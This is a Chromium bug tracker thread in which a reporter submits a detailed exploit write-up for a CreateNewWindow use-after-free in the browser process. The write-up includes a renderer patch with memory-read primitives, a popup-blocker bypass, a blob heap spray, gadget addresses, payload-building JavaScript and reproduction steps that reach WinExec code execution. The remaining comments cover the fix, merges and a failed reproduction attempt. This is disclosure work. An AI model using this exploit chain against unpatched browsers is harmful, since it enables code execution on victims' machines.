Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### je...@gmail.com (2026-03-02)

To the Chrome VRP team:

I have written a complete exploit writeup for this vulnerability, achieving full sandbox escape starting from a compromised renderer. This should qualify for the $250,000 reward tier of "High-quality report with demonstration of RCE." The full writeup follows:

# Exploiting a CreateNewWindow SINGLETON\_TAB Use-After-Free for Browser Process Code Execution

## Overview

This document describes the complete exploitation of a use-after-free vulnerability in `RenderFrameHostImpl::CreateNewWindow()` in the Chromium browser process. The exploit operates under the compromised renderer threat model: only the renderer process code is modified, while the browser process binary remains entirely untouched. The end result is arbitrary code execution in the browser process on Windows x64, demonstrated by calling `WinExec("calc")` through a Call-Oriented Programming (COP) chain built entirely from existing code gadgets in `chrome.dll` and system DLLs.

The vulnerability arises because `CreateNewWindow()` captures a raw pointer to a newly allocated `RenderFrameHostImpl`, then transfers ownership of the containing `WebContents` to the browser UI layer via `ShowCreatedWindow()`. When the renderer forces a `SINGLETON_TAB` disposition for a URL that already exists as an open tab, the browser's `Navigate()` function matches the existing tab and allows the new `WebContents` (along with its `RenderFrameHostImpl`) to be destroyed when the `unique_ptr` goes out of scope. However, `ShowCreatedWindow()` returns a non-null pointer to the pre-existing tab's `WebContents`, causing `CreateNewWindow()` to enter its `else if` branch and dereference the now-freed `RenderFrameHostImpl` through five virtual calls. The freed object is 5552 bytes on a Windows x64 Release build, falling into PartitionAlloc bucket 5632. The dangling pointer is a stack-local `auto*` variable, not a `raw_ptr<T>` field, so MiraclePtr does not protect it.

The rest of this document focuses on the exploitation techniques: heap spraying to reclaim the freed memory slot, bypassing ASLR, discovering COP gadgets in chrome.dll, constructing the payload, and achieving code execution.

## Heap Spray: Cross-Thread Blob Allocation on the IO Thread

### The Timing Challenge

The free (RFHI destruction inside `Navigate()`) and the use (`GetView()` virtual call) occur within the same synchronous function call chain on the browser's UI thread. Between these two points, there is no message loop pump. The UI thread is blocked handling the `[Sync]` IPC and will not dispatch any other Mojo messages from the renderer. This means the attacker cannot use the same renderer's Mojo channel to send additional messages that would trigger allocations on the UI thread during the critical window.

### Why the IO Thread Works

The critical observation that enables the exploit is that `blink.mojom.BlobRegistry` binds on the browser's IO thread, not the UI thread. The binding code explicitly asserts this:

```
// content/browser/blob_storage/blob_registry_wrapper.cc
void BlobRegistryWrapper::Bind(
    int process_id,
    mojo::PendingReceiver<blink::mojom::BlobRegistry> receiver) {
  DCHECK_CURRENTLY_ON(BrowserThread::IO);

```

The interface is registered in the renderer process host through this wrapper:

```
// content/browser/renderer_host/render_process_host_impl_receiver_bindings.cc
registry->AddInterface(base::BindRepeating(
    &BlobRegistryWrapper::Bind, storage_partition_impl_->GetBlobRegistry(),
    GetDeprecatedID()));

```

When a renderer creates a `Blob` object in JavaScript, the `BlobRegistry::Register()` Mojo call is dispatched on the IO thread. The registration handler allocates a `std::vector<uint8_t>` to hold the blob's inline data, and this allocation goes through PartitionAlloc:

```
// storage/browser/blob/blob_registry_impl.cc
void BlobRegistryImpl::Register(
    mojo::PendingReceiver<blink::mojom::Blob> blob,
    const std::string& uuid,
    const std::string& content_type,
    const std::string& content_disposition,
    std::vector<blink::mojom::DataElementPtr> elements,
    RegisterCallback callback) {
  ...
  blobs_under_construction_[uuid] = std::make_unique<BlobUnderConstruction>(
      this, uuid, content_type, content_disposition, std::move(element_entries),
      receivers_.GetBadMessageCallback());

  std::unique_ptr<BlobDataHandle> handle = context_->AddFutureBlob(
      uuid, content_type, content_disposition, ...);

```

Each `new Blob([new Uint8Array(5500)])` in JavaScript produces a persistent 5500-byte allocation on the browser's IO thread. As long as JavaScript retains a reference to the `Blob` object, the backing vector remains alive. The attacker therefore controls both the size and the contents of allocations happening concurrently on a different thread during the UAF window.

### Cross-Thread Reclamation via the Central Freelist

The reason allocations on the IO thread can reclaim memory freed by the UI thread lies in how PartitionAlloc handles large allocations. PartitionAlloc defines a thread cache size threshold:

```
// base/allocator/partition_allocator/src/partition_alloc/partition_alloc_constants.h
static inline constexpr size_t kThreadCacheDefaultSizeThreshold = 512;

```

The `ThreadCache` class uses this constant as its upper bound:

```
// base/allocator/partition_allocator/src/partition_alloc/thread_cache.h
static constexpr size_t kDefaultSizeThreshold =
    kThreadCacheDefaultSizeThreshold;

```

Allocations larger than 512 bytes bypass the per-thread cache entirely and go through the central freelist, which is shared across all threads without any thread-local isolation. Since `sizeof(RenderFrameHostImpl) = 5552` places it in PartitionAlloc bucket 5632, this is far above the 512-byte threshold. When the UI thread frees the RFHI and its slot returns to the central freelist, any thread performing a same-bucket allocation can immediately pop that exact slot. The IO thread's concurrent 5500-byte blob allocations (which also land in bucket 5632) are perfectly positioned to do so.

The race window is narrow but real. After the RFHI is freed, the remaining code in the destruction chain (WebContentsImpl member teardown, `Navigate` return, `AddWebContents` return, `ShowCreatedWindow` return, and the `if/else` branch evaluation) executes several hundred instructions before `GetView()` dereferences the freed slot. During this time, twelve renderer processes are continuously submitting `BlobRegistry::Register()` calls that the IO thread processes independently.

### Bypassing the Popup Blocker to Open Spray Windows

The heap spray requires opening twelve cross-origin windows from JavaScript via `window.open()`. Under normal circumstances, Chromium's popup blocker would suppress these calls because no user gesture (click or keyboard event) has occurred. The blocker's enforcement, however, relies on the renderer honestly reporting whether a user gesture is present.

When the renderer calls the synchronous `content.mojom.FrameHost.CreateNewWindow` IPC, it fills a `CreateNewWindowParams` structure that includes a boolean `allow_popup` field. The browser process reads this field in `RenderFrameHostImpl::CreateNewWindow()` and uses it to decide whether to proceed with window creation or reject it as a blocked popup. The critical point is that the browser directly trusts this renderer-supplied value without performing any independent verification of whether a real user gesture actually occurred:

```
// content/browser/renderer_host/render_frame_host_impl.cc
// The browser reads params->allow_popup directly from the Mojo message
// and uses it in the popup decision logic. There is no server-side
// re-validation of the user gesture claim.

```

In the unmodified renderer, `allow_popup` is set based on a legitimate user gesture check:

```
// content/renderer/render_frame_impl.cc (original)
params->allow_popup = false;
if (GetContentClient()->renderer()->AllowPopup())
    params->allow_popup = true;

```

The compromised renderer simply sets this field to `true` unconditionally, removing the gesture requirement entirely:

```
// content/renderer/render_frame_impl.cc (patched)
params->allow_popup = true;

```

With this single-line change, `window.open()` calls from JavaScript succeed regardless of whether any user interaction has occurred. The exploit page can therefore open twelve spray windows and fire repeated UAF trigger calls programmatically, without requiring the victim to click anything on the page.

### Leveraging Site Isolation for Multi-Process Spray

With the popup blocker neutralized, the main exploit page opens twelve cross-origin windows on ports 8801 through 8812. The cross-origin aspect is deliberate and essential: Chromium's site isolation policy mandates that each distinct origin runs in its own renderer process. By serving each spray page on a different port (`127.0.0.1:8801` through `127.0.0.1:8812`), the exploit forces the browser to create twelve separate renderer processes, each with its own independent Mojo channel to the browser's IO thread.

Each spray window creates batches of fifty 5500-byte `Blob` objects every five milliseconds, retaining up to 5000 live references. The spray data places the COP payload at specific offsets within the blob (details in the payload construction section below) and fills the rest with `0x41` padding.

The choice of twelve windows is deliberate. The IO thread services the Mojo pipes from all renderer processes in an event-driven fashion. With twelve concurrent producers, the aggregate blob creation rate creates sufficient allocation pressure to consistently reclaim the freed RFHI slot within the race window. Empirical testing shows the probability of at least one blob allocation landing in the freed slot is approximately 80%. Fewer spray processes would reduce the allocation rate and widen the gap between free and reclamation, while more processes would yield diminishing returns against the overhead of process creation.

## ASLR Bypass via Windows DLL Base Sharing

Windows randomizes DLL base addresses at system boot or first load, but reuses the same base address for all subsequent processes within the same login session. Since both the renderer and browser processes load `chrome.dll` and `kernel32.dll`, the addresses of functions and data within these modules read by the renderer are equally valid in the browser process.

The renderer patch injects three V8 callbacks into the JavaScript global object to expose this cross-process address equivalence. The first callback calls `GetModuleHandleA` and returns the DLL base address:

```
// Renderer patch: content/renderer/render_frame_impl.cc
static void ExploitGetModuleBase(
    const v8::FunctionCallbackInfo<v8::Value>& args) {
  v8::Isolate* isolate = args.GetIsolate();
  v8::String::Utf8Value name(isolate, args[0]);
  HMODULE h = GetModuleHandleA(*name);
  args.GetReturnValue().Set(
      v8::BigInt::NewFromUnsigned(isolate, reinterpret_cast<uint64_t>(h)));
}

```

The second calls `GetProcAddress` to look up exported function addresses:

```
// Renderer patch: content/renderer/render_frame_impl.cc
static void ExploitGetProcAddr(
    const v8::FunctionCallbackInfo<v8::Value>& args) {
  v8::Isolate* isolate = args.GetIsolate();
  v8::String::Utf8Value mod_name(isolate, args[0]);
  v8::String::Utf8Value func_name(isolate, args[1]);
  HMODULE h = GetModuleHandleA(*mod_name);
  FARPROC p = h ? GetProcAddress(h, *func_name) : nullptr;
  args.GetReturnValue().Set(
      v8::BigInt::NewFromUnsigned(isolate, reinterpret_cast<uint64_t>(p)));
}

```

The third performs an SEH-protected 8-byte read at an arbitrary virtual address, allowing the exploit to verify gadget bytes and data at runtime before committing:

```
// Renderer patch: content/renderer/render_frame_impl.cc
static void ExploitReadQword(
    const v8::FunctionCallbackInfo<v8::Value>& args) {
  v8::Isolate* isolate = args.GetIsolate();
  bool lossless = false;
  uint64_t addr = args[0].As<v8::BigInt>()->Uint64Value(&lossless);
  uint64_t value = 0;
  __try {
    value = *reinterpret_cast<uint64_t*>(addr);
  } __except(EXCEPTION_EXECUTE_HANDLER) {
    value = 0;
  }
  args.GetReturnValue().Set(
      v8::BigInt::NewFromUnsigned(isolate, value));
}

```

At exploit runtime, JavaScript uses these primitives to resolve four concrete addresses: the `chrome.dll` base address, a real vtable address within chrome.dll's `.rdata` section, the `WinExec` function address from `kernel32.dll`, and a `"calc"` string address within chrome.dll's `.rdata` section. Because DLL bases are shared within the session, every resolved address is directly valid in the browser process without any further adjustment.

## Gadget Discovery in chrome.dll

### The Control Flow Guard Constraint

Windows Control Flow Guard (CFG) validates every indirect call target against a bitmap of approved addresses. Even with full control over the vtable pointer, the `call [vtable + offset]` destination must be CFG-valid. Arbitrary addresses such as ROP gadgets or shellcode would trigger `STATUS_FAIL_FAST_EXCEPTION` and terminate the process before the attacker's code could execute. This constraint means the exploit cannot simply point vtable entries at arbitrary instruction sequences; it must find real, linker-approved function entry points that happen to perform useful operations when chained together.

### Understanding the UAF Call Site

Before searching for gadgets, it is essential to understand exactly what the UAF site does. The freed `new_main_rfh` pointer is dereferenced through five virtual calls:

```
// content/browser/renderer_host/render_frame_host_impl.cc
} else if (new_main_rfh->GetView()) {                         // Call 1: vtable[0x98]
    reply->widget_screen_rect.emplace(
        new_main_rfh->GetView()->GetViewBounds());             // Calls 2,3: vtable[0x98] then vtable[0x2D0]
    reply->window_screen_rect.emplace(
        new_main_rfh->GetView()->GetBoundsInRootWindow());     // Calls 4,5: vtable[0x98] then vtable[0x2D0]

```

The dispatch works as follows: the CPU reads offset 0 of the freed object to obtain a vtable pointer, then reads a function pointer from the vtable at a specific offset, and dispatches an indirect call:

```
mov rax, [rcx]          ; rax = vtable ptr = *(freed_slot + 0)
call [rax + 0x98]       ; call vtable[19] = GetView()

```

Calls 1, 2, and 4 all invoke `GetView()` at vtable offset 0x98 (slot 19). Calls 3 and 5 invoke `GetViewBounds()` and `GetBoundsInRootWindow()` respectively, both dispatched at vtable offset 0x2D0 (slot 90). The exploit therefore needs two gadgets: one at vtable slot 19 that returns a non-null value (to avoid early bailout from the `if` check), and one at vtable slot 90 that performs the actual code execution.

### Automated Gadget Scanning

The gadget discovery process was automated using the Python script `find_real_gadgets_v2.py`, which performs a four-phase systematic scan of chrome.dll (approximately 1.6 GB): parsing PE headers and import tables, searching the `.text` section for `mov rax, rcx; ret` byte patterns (finding 389 identity gadget locations), locating vtable candidates in the `.rdata` section whose slot 0x98 contains an identity gadget pointer (3355 candidates), and finally disassembling the function at each candidate's slot 0x2D0 using the Capstone engine and classifying it by behavior. Among the 59 candidates that "read a field from rcx then call through an indirect pointer," the script identified the vtable at RVA `0x0EFB8950`, whose slot 0x98 points to the identity gadget (RVA `0x00001EA0`) and slot 0x2D0 points to a three-instruction COP gadget (RVA `0x002341E0`): it loads a function pointer from `[rcx+0x20]`, loads an argument from `[rcx+0x28]`, and tail-calls through `GuardCFDispatchFunctionPointer`. A single vtable pointer satisfies both required slots.

### The Two Gadgets

The identity gadget resides at chrome.dll RVA `0x00001EA0`:

```
; chrome.dll RVA 0x00001EA0
mov rax, rcx    ; 48 89 c8
ret             ; c3

```

This function simply returns its first argument. In the context of the UAF, when `GetView()` is called on the freed object, `rcx` points to the blob data occupying the freed slot. The identity gadget returns this blob pointer, so the caller receives it as the supposed "view" object. Because the blob address is non-null, the `if` check in Call 1 passes and execution enters the code body.

The COP gadget resides at chrome.dll RVA `0x002341E0`:

```
; chrome.dll RVA 0x002341E0
mov rax, [rcx+0x20]       ; load function pointer from object
mov rcx, [rcx+0x28]       ; load first argument from object
jmp [rip+0x1091c339]      ; tail-call through GuardCFDispatchFunctionPointer

```

This gadget is the core of the exploit. It loads a function pointer from offset 0x20 of the object pointed to by `rcx`, loads a new first argument from offset 0x28, and then tail-calls through `__guard_dispatch_icall_fptr` (the Windows CFG dispatch function, located at chrome.dll RVA `0x10B50528`). The CFG dispatch function validates the target address in `rax` against the CFG bitmap and, if valid, jumps to it.

Both gadgets are genuine `chrome.dll` functions. Because they are real function entry points whose addresses appear in vtables and are taken by address elsewhere in the codebase, the linker has already marked them as valid indirect call targets in the CFG bitmap. The COP gadget's `jmp` goes through the official Windows CFG validation path, and since the exploit sets `rax` to `WinExec` (a `kernel32.dll` export), and all exported API functions are valid CFG targets, the validation passes naturally. No custom gadgets are compiled into the binary. This constitutes a CFG bypass: rather than breaking the CFG bitmap itself, the exploit exclusively reuses targets already marked as legitimate, causing every step in the chain to pass CFG validation within its own rules, ultimately achieving arbitrary function calls.

The following diagram illustrates the pointer relationships between the three key data structures at runtime: the blob data occupies the freed RFHI slot, its first 8 bytes point to a real vtable in the `.rdata` section, the vtable's two slots point to the identity gadget and COP gadget in the `.text` section respectively, and offsets 0x20 and 0x28 within the blob hold the `WinExec` address and the `"calc"` string address:

```
  Freed RFHI slot (occupied by blob data)
  +--------+------------------------------+
  | +0x00  | vtable ptr (0x0EFB8950+base) -----------+
  | +0x08  | 0x41414141 41414141  (pad)    |         |
  | +0x10  | 0x41414141 41414141  (pad)    |         |
  | +0x18  | 0x41414141 41414141  (pad)    |         |
  | +0x20  | WinExec addr  ----------------------+   |
  | +0x28  | "calc" str addr  ----------------+  |   |
  | +0x30  | 0x41414141 41414141  (pad)    |  |  |   |
  |  ...   |         ...                   |  |  |   |
  +--------+------------------------------+  |  |   |
                                              |  |   |
  chrome.dll .rdata: real vtable              |  |   |
  (base + 0x0EFB8950)  <-------------------------+   |
  +------------------+------------------------+  |   |
  | slot 0  (+0x00)  | some func addr         |  |   |
  | slot 1  (+0x08)  | some func addr         |  |   |
  |       ...        |       ...              |  |   |
  | slot 19 (+0x98)  | identity gadget  ------+--+---+--+
  |       ...        |       ...              |  |   |  |
  | slot 90 (+0x2D0) | COP gadget  -----------+--+---+  |
  |       ...        |       ...              |  |  ||   |
  +------------------+------------------------+  |  ||   |
                                                 |  ||   |
  chrome.dll .rdata: "calc" string               |  ||   |
  (base + 0x1048110C)  <-------------------------+  ||   |
  +--------------+                                  ||   |
  | "calc\0"     |  (CSS calc() keyword)            ||   |
  +--------------+                                  ||   |
                                                    ||   |
  kernel32.dll                                      ||   |
  +--------------+  <-------------------------------+|   |
  | WinExec()    |                                   |   |
  +--------------+                                   |   |
                                                     |   |
  chrome.dll .text                                   |   |
  +--------------------------------------------+    |   |
  | identity gadget (base+0x1EA0)  <-----------------+---+
  |   mov rax, rcx                             |    |
  |   ret                                      |    |
  +--------------------------------------------+    |
  | COP gadget (base+0x2341E0)  <--------------------+
  |   mov rax, [rcx+0x20]   ; rax = WinExec   |
  |   mov rcx, [rcx+0x28]   ; rcx = &"calc"   |
  |   jmp [GuardCFDispatch]  ; CFG-validated   |
  +--------------------------------------------+

```
### Finding the "calc" String

The exploit also needs a pointer to a null-terminated `"calc"` string to pass as the first argument to `WinExec`. Rather than constructing this string in spray data (which would require knowing the spray allocation address in the browser process), the exploit reuses an existing `"calc\0"` string in chrome.dll's `.rdata` section at RVA `0x1048110C`. This string exists because it is the CSS `calc()` function keyword embedded in Chrome's CSS parser data. The exploit verifies this at runtime using `exploitReadQword`:

```
var chrome_calc = chrome_base + BigInt(CHROME_CALC_RVA);
var calc_val = exploitReadQword(chrome_calc);
if ((calc_val & 0xFFFFFFFFFFn) === 0x00636C6163n) {  // "calc\0" little-endian
    cmdstr_addr = chrome_calc;
}

```
## Constructing the COP Payload

### Blob Data Layout

The 5500-byte blob data is carefully structured so that when it occupies the freed RFHI slot, the critical fields align precisely with the vtable dispatch and COP gadget expectations:

At offset 0x00 (8 bytes), the blob contains the vtable address pointing to chrome.dll `.rdata` RVA `0x0EFB8950`. This is the first qword that the virtual dispatch mechanism reads when performing `mov rax, [rcx]` on the freed object pointer.

At offset 0x20 (8 bytes), the blob contains the `WinExec` address from `kernel32.dll`. The COP gadget reads this with `mov rax, [rcx+0x20]` and loads it as the function pointer to call.

At offset 0x28 (8 bytes), the blob contains the address of the `"calc"` string in chrome.dll's `.rdata` section (RVA `0x1048110C`). The COP gadget reads this with `mov rcx, [rcx+0x28]` and passes it as the first argument to `WinExec`.

All remaining bytes (offsets 0x08 through 0x1F, and 0x30 through the end) are filled with `0x41` as inert padding. The spray page constructs this layout in JavaScript:

```
function createSprayData() {
    var buf = new ArrayBuffer(BLOB_SIZE);   // 5500 bytes
    var u8 = new Uint8Array(buf);
    u8.fill(0x41);
    var dv = new DataView(buf);
    dv.setBigUint64(0x00, VTABLE_ADDR, true);   // [+0x00] fake vtable pointer
    dv.setBigUint64(0x20, WINEXEC_ADDR, true);   // [+0x20] WinExec function addr
    dv.setBigUint64(0x28, CMDSTR_ADDR, true);    // [+0x28] "calc" string addr
    return new Uint8Array(buf);
}

```
### Call Execution Trace

When the IO thread's blob allocation wins the race and fills the freed RFHI slot with this payload, the virtual calls at the UAF site execute as follows.

```
UAF site: new_main_rfh->GetView()
          |
          v
+-- Call 1: GetView() ------------------------------------------------+
|  CPU executes:                                                       |
|    rcx = blob addr (= new_main_rfh, points to reclaimed slot)       |
|    rax = [rcx + 0x00] = vtable ptr (0x0EFB8950 + base)              |
|    call [rax + 0x98]  -> jumps to identity gadget                    |
|                                                                      |
|  identity gadget:                                                    |
|    mov rax, rcx   -> rax = blob addr                                 |
|    ret             -> returns blob addr (non-NULL!)                   |
|                                                                      |
|  return != NULL -> enters if-body [check passed]                     |
+----------------------------------------------------------------------+
          |
          v
+-- Call 2: GetView() ------------------------------------------------+
|  Same as Call 1, identity gadget returns blob addr again              |
|  Caller gets "view" ptr (actually blob addr), calls GetViewBounds    |
+----------------------------------------------------------------------+
          |
          v
+-- Call 3: view->GetViewBounds() ------------------------------------+
|  CPU executes:                                                       |
|    rcx = blob addr (treated as "view" object)                        |
|    rax = [rcx + 0x00] = vtable ptr (same vtable)                     |
|    call [rax + 0x2D0] -> jumps to COP gadget                         |
|                                                                      |
|  COP gadget:                                                         |
|    mov rax, [rcx+0x20]  -> rax = blob[0x20] = WinExec addr          |
|    mov rcx, [rcx+0x28]  -> rcx = blob[0x28] = "calc" string addr    |
|    jmp [GuardCFDispatch] -> CFG validates WinExec -> PASS!           |
|                                                                      |
|  WinExec("calc") executes -> Calculator launched! *                  |
+----------------------------------------------------------------------+

```

The core idea of the entire chain can be summarized as: one vtable, two roles. The identity gadget at slot 0x98 is responsible for "deception," making every `GetView()` call return the blob's own address (non-null, passing the check). The COP gadget at slot 0x2D0 is responsible for "execution," reading a function pointer and argument from fixed offsets in the blob and calling `WinExec` through the official Windows CFG dispatch mechanism. Because these two gadgets happen to coexist within the same real vtable, only a single 8-byte vtable pointer at the beginning of the blob is needed to drive both behaviors.

## Complete Exploit Flow

The exploit executes from a single page loaded at `localhost:8800`.

First, the page performs address resolution via the ASLR bypass primitives. JavaScript calls `exploitGetModuleBase('chrome.dll')` to obtain the chrome.dll base, computes the real vtable address by adding RVA `0x0EFB8950`, calls `exploitGetProcAddr('kernel32.dll', 'WinExec')` to get the WinExec address, and computes the `"calc"` string address by adding RVA `0x1048110C`. It then uses `exploitReadQword` to verify that the vtable's slot 0x98 contains the identity gadget address, slot 0x2D0 contains the COP gadget address, the identity gadget's first four bytes are `48 89 c8 c3`, and the COP gadget's first eight bytes are `48 8b 41 20 48 8b 49 28`.

It then opens twelve cross-origin spray windows on ports 8801 through 8812, passing the resolved addresses as URL parameters. Each spray window immediately begins creating fifty 5500-byte blobs every five milliseconds, with the COP payload placed at the appropriate offsets. After waiting five seconds for the spray to build allocation pressure across all twelve IO-thread Mojo channels, the page begins firing UAF triggers by calling `window.open(location.href)` fifty times at 200-millisecond intervals. The renderer patch forces `SINGLETON_TAB` for this self-URL open, causing the browser to destroy the newly created `RenderFrameHostImpl` while returning a non-null pointer. When a blob allocation on the IO thread wins the race and fills the freed slot, the COP chain executes `WinExec("calc")` and Calculator appears on the desktop.

## Reproduction

### Prerequisites

The exploit was developed on Windows 10 Pro 10.0.19045 x64, requiring a Chromium source tree (commit `cdd1f63c02a65c37ccdb85e85b25dbec456c9914`, `refs/heads/main@{#1590015}`) and a Release build in `out/release`. The `args.gn` configuration is as follows:

```
is_debug = false
dcheck_always_on = false

```
### Applying the Renderer Patch

The renderer patch modifies `content/renderer/render_frame_impl.cc` with three functional changes: V8 helper callbacks for ASLR bypass and memory reading, an unconditional popup blocker bypass, and a `SINGLETON_TAB` disposition override for self-URL opens. Apply it from the Chromium source root:

```
cd /path/to/chromium/src
git apply exploit/step1-blob-spray/patches/renderer.patch

```

If the patch is already applied (verify with `git diff content/renderer/render_frame_impl.cc`), proceed directly to building:

```
taskkill /F /IM chrome.exe
autoninja -C out/release chrome

```
### Exploit File Structure

The exploit consists of two HTML files served by HTTP servers. The main entry point `index.html` handles ASLR bypass, spray window orchestration, and UAF triggering. Each cross-origin spray window loads `spray.html`, which continuously creates blobs containing the COP chain payload. The two files must be served on thirteen ports (8800 for the main page, 8801 through 8812 for spray windows) so that site isolation places each spray window in a separate renderer process.

### Manual Testing

Start thirteen HTTP servers serving the exploit directory:

```
for port in $(seq 8800 8812); do
    python -m http.server $port -d path/to/exploit &
done

```

Launch Chrome with a fresh profile and navigate to the main exploit page:

```
out/release/chrome.exe \
    --user-data-dir=%TEMP%/pwn-%RANDOM% \
    --no-first-run \
    http://localhost:8800/index.html

```

The page automatically resolves runtime addresses, opens twelve spray windows, waits five seconds for the blob spray to build allocation pressure, then fires a UAF trigger every 200 milliseconds. When the spray wins the race and a blob allocation reclaims the freed RFHI slot, the COP chain executes `WinExec("calc")` in the browser process, and Calculator appears on the desktop.

### pe...@google.com (2026-03-02)

The NextAction date has arrived: 2026-03-02
To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the "Chromium Labels" custom field.

### sz...@chromium.org (2026-03-02)

Note that the `allow_popup` issue has been present since the very beginning of Chrome:

https://chromium.googlesource.com/chromium/src/+/09911bf300f1a419907a9412154760efd0b7abc3%5E%21/chrome/browser/resource_message_filter.cc

Probably should get that fixed; cc mustaq@ from the interactions team to investigate this aspect.

### sz...@chromium.org (2026-03-02)

Why does your merge fit within the merge criteria for these milestones?

This is a significant security vulnerability.

What changes specifically would you like to merge? Please link to Gerrit.

https://chromium-review.googlesource.com/7610581

Have the changes been released and tested on canary?

Yes; hit canary on Feb. 27.

Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No

[Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative?

No

If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

No

### sz...@chromium.org (2026-03-02)

I've filed a separate issue about the handling of `allow_popup`:

https://issues.chromium.org/489023922

### dr...@chromium.org (2026-03-03)

No crashes seen in Canary. we're not planning any more M144 or M145 releases, so approving merge only to M146.

### ch...@google.com (2026-03-03)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-03)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-03)

Merge review required: M144 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### dx...@google.com (2026-03-04)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Stefan Zager [szager@chromium.org](mailto:szager@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7630156>

[M146] Fix CreateNewWindow() to correctly handle a reused tab

---


Expand for full commit details
```
     
    Cherry-picked from: 
     
    https://chromium-review.googlesource.com/c/chromium/src/+/7610581 
     
    Bug: 487338366 
    Change-Id: I534d83c19f2d0d501edf3f656362fbff0b0f0aef 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7630156 
    Reviewed-by: Charlie Reis <creis@chromium.org> 
    Commit-Queue: Stefan Zager <szager@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7680@{#1869} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `content/browser/renderer_host/render_frame_host_impl.cc`

---

Hash: [dc918deb95ab9bdabddc85d50d11154dbd60f57d](https://chromiumdash.appspot.com/commit/dc918deb95ab9bdabddc85d50d11154dbd60f57d)  

Date: Wed Mar 4 18:06:41 2026


---

### pe...@google.com (2026-03-04)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### qk...@google.com (2026-03-09)

Added `LTS-NotApplicable-138` label, M138 has the suspected CL[1], but the fix were conflicts with some files when trying to merge back it to M138. It might affect the stability of the M138 LTS.

[1] https://chromium-review.git.corp.google.com/c/chromium/src/+/6343761

### aj...@google.com (2026-04-08)

Attempting the exploit - I hit an AV in an official release build and in the gn args from the reporter - let me know if you want to provide updates, or we can reward the base report without the exploit.

```
6:098> k
 # Child-SP          RetAddr               Call Site
00 000000d6`d75fcd40 00007ff9`d7eb1865     chrome!content::ExploitReadQword+0x44 [D:\chromium\src\content\renderer\render_frame_impl.cc @ 4770] 
01 000000d6`d75fcda0 00007ff9`d7eaf9bc     chrome!Builtins_CallApiCallbackGeneric+0xa5
02 000000d6`d75fcde8 00007ff9`d7eac75c     chrome!Builtins_InterpreterEntryTrampoline+0x13c
03 000000d6`d75fce88 00007ff9`d7eac2bf     chrome!Builtins_JSEntryTrampoline+0x5c
04 000000d6`d75fceb8 00007ff9`c9d693ed     chrome!Builtins_JSEntry+0xff
05 000000d6`d75fcfe0 00007ff9`c9d6991b     chrome!v8::internal::`anonymous namespace'::Invoke+0x100d
06 000000d6`d75fd1d0 00007ff9`c9bec86c     chrome!v8::internal::Execution::CallScript+0xdb
07 000000d6`d75fd260 00007ff9`d43acfa1     chrome!v8::Script::Run+0x33c
08 000000d6`d75fd380 00007ff9`d31f66c9     chrome!blink::V8ScriptRunner::CompileAndRunScript+0xdc1
09 000000d6`d75fd650 00007ff9`d31dc4dc     chrome!blink::ClassicScript::RunScriptOnScriptStateAndReturnValue+0xd9
0a 000000d6`d75fd720 00007ff9`d31dc5eb     chrome!blink::Script::RunScriptOnScriptState+0x8c
0b 000000d6`d75fd7b0 00007ff9`d34c8f88     chrome!blink::Script::RunScript+0x6b
0c 000000d6`d75fd810 00007ff9`d34ea1b2     chrome!blink::PendingScript::ExecuteScriptBlock+0x688
0d 000000d6`d75fd9a0 00007ff9`d490e014     chrome!blink::ScriptLoader::PrepareScript+0x17a2
